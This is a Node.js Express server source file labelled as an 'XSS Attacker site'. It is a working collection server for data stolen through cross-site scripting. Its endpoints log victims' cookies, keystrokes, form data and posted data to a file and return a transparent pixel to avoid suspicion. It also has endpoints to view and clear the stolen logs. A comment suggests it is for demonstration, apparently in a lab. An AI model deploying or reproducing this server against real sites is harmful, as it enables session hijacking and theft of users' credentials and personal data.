const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 443;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Logging function
function logStolen(type, data, source) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${type} from ${source}: ${JSON.stringify(data)}\n`;
    
    console.log(`STOLEN DATA - ${logEntry.trim()}`);
    
    // Append to log file
    fs.appendFileSync('/app/logs/stolen-data.log', logEntry);
}

// Routes for receiving stolen data
app.get('/steal', (req, res) => {
    const stolenData = {
        cookies: req.query.cookies || req.query.cookie,
        url: req.query.url,
        data: req.query.data,
        userAgent: req.headers['user-agent'],
        referer: req.headers.referer
    };
    
    logStolen('COOKIES', stolenData, req.ip);
    
    // Return 1x1 transparent pixel to avoid suspicion
    res.setHeader('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.post('/exfil', (req, res) => {
    logStolen('POST_DATA', req.body, req.ip);
    res.json({ status: 'received' });
});

app.get('/keylog', (req, res) => {
    logStolen('KEYSTROKES', { key: req.query.key }, req.ip);
    res.status(200).send('OK');
});

app.get('/form-data', (req, res) => {
    logStolen('FORM_DATA', req.query, req.ip);
    res.status(200).send('OK');
});

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API to show stolen data (for demonstration)
app.get('/api/stolen-data', (req, res) => {
    try {
        const logPath = '/app/logs/stolen-data.log';
        if (fs.existsSync(logPath)) {
            const logs = fs.readFileSync(logPath, 'utf8').split('\n').filter(line => line.trim());
            res.json({ logs: logs.slice(-20) }); // Last 20 entries
        } else {
            res.json({ logs: [] });
        }
    } catch (error) {
        res.status(500).json({ error: 'Failed to read logs' });
    }
});

// Clear logs endpoint
app.post('/api/clear-logs', (req, res) => {
    try {
        fs.writeFileSync('/app/logs/stolen-data.log', '');
        res.json({ status: 'cleared' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to clear logs' });
    }
});

// Start HTTPS server
const options = {
    key: fs.readFileSync('/app/ssl/server.key'),
    cert: fs.readFileSync('/app/ssl/server.crt')
};

https.createServer(options, app).listen(port, () => {
    console.log(`XSS Attacker site running on https://localhost:${port}`);
});